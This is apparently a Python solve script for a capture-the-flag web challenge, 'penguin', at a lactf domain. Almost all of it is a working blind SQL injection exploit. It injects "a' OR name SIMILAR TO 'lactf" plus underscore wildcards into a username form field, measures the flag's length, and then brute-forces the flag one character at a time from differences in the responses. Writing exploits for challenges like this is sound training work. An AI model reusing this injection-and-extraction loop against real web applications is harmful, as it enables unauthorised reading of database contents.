import requests
url = "https://penguin.chall.lac.tf/"
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
sql_injection_UwU = "a' OR name SIMILAR TO 'lactf"

# Get the flag length
while(1):
	response = requests.post(url+'/submit', data={"username": f"{sql_injection_UwU+'_'}"},headers={"Content-Type": "application/x-www-form-urlencoded"}).text
	sql_injection_UwU = sql_injection_UwU + "_"
	if 'No penguins sadg' not in response:
		break
#Here we got the length of the flag
print(sql_injection_UwU)
print("lenght is: "+str(len(sql_injection_UwU) - 28))
sql_injection_UwU = "a' OR name SIMILAR TO 'lactf"
#Now its time to bruteforce the flag "Be awar that we cant type the {} in the flag so we will bruteforce the flag without them and add them later"
for i in range(40):
	for x in charset:
		temp = sql_injection_UwU + x
		response = requests.post(url+'/submit', data={"username": f"{temp+'_'*(68-len(temp))}"},headers={"Content-Type": "application/x-www-form-urlencoded"}).text
		if 'We found a penguin!!!!!' in response:
			sql_injection_UwU = temp
			break
flag = sql_injection_UwU[23:28] + "{" + sql_injection_UwU[29:67] + "}"
print(flag)
